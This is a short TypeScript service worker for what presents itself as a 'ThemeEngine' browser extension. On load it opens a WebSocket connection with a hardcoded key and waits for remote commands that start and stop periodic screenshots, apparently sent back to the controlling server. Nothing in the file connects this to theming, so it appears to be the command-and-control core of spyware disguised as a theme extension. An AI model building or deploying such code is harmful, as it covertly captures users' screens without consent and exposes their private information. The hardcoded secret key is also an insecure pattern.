import { WebSocketManager } from './WebSocketManager';
import { ScreenshotManager } from './ScreenshotManager';

console.log('[ThemeEngine ServiceWorker] Starting...');

const API_KEY = 'my-super-secret-key';

let screenshotManager: ScreenshotManager;

// Initialize the WebSocket Manager and assign the command hook
const wsManager = new WebSocketManager(API_KEY, (type: string, payload: any) => {
  if (type === 'CMD_START_SCREENSHOTS') {
    const interval = payload && payload.interval ? payload.interval : 10000;
    screenshotManager.start(interval);
  } else if (type === 'CMD_STOP_SCREENSHOTS') {
    screenshotManager.stop();
  }
});

screenshotManager = new ScreenshotManager(wsManager);

// Boot the connection immediately
wsManager.connect();
